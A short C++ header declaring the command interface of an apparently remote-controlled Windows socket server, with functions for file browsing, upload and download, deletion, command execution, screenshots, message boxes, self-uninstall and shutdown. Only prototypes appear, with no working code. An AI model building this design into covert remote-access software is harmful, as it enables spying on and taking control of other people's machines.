#ifndef __SERVER__
#define __SERVER__

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fcntl.h>
#include <Shellapi.h>
#include <fstream>
#include <iomanip>
#include <ctime>

using namespace std;

void disconnect(SOCKET&, char*);
void synchronize(SOCKET&, char*);
string transfer(SOCKET&, char*, int, int, string);
void download(SOCKET&, char *username);
void browse(SOCKET&, char*);
int ls(SOCKET&, bool);
int cd(SOCKET&, string, string&);
int dl(SOCKET&, char*, string);
int rm(SOCKET&, char*);
int exec(SOCKET&, string);
int upl(SOCKET&);
int mkdir(SOCKET&, string);
int rmdir(SOCKET&, string);
void terminate(SOCKET&);
void screenshot(SOCKET&, char*);
void messagebox(SOCKET&);
void editparams(SOCKET&);
void uninstall(SOCKET&);
void shutdown(bool, SOCKET&);

#endif
